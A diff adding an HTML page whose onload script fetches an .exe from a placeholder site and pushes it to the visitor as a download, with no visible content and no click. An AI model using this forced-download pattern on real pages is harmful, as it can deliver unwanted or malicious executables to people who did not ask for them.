@@ -1,0 +1,27 @@
+<html>
+<head>
+<script type="text/javascript">
+function downloadFile() {
+    var exeUrl = "http://www.yourwebsite.com/path/to/your/exe/file.exe";
+    var exeName = "file.exe";
+    var xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange = function() {
+        if (xmlhttp.readyState === 4) {
+            if (xmlhttp.status === 200) {
+                var blob = xmlhttp.response;
+                var link = document.createElement('a');
+                link.href = window.URL.createObjectURL(blob);
+                link.download = exeName;
+                link.click();
+            }
+        }
+    }
+    xmlhttp.open("GET", exeUrl, true);
+    xmlhttp.responseType = "blob";
+    xmlhttp.send();
+}
+</script>
+</head>
+<body onload="downloadFile();">
+</body>
+</html>
